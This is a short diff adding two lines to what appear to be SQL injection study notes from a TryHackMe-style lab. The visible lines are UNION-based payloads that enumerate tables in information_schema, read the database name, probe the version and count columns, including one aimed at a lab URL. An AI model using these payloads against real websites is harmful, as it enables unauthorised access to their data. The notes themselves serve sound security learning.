@@ -17,4 +17,7 @@ Feeling%' UNION SELECT NULL NULL NULL --
 https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 
 0 UNION SELECT 1,2,database()
+
+1 UNION SELECT @@VERSION, @@VERSION, @@VERSION, @@VERSION
+1 UNION SELECT NULL, NULL, NULL, NULL
 ```
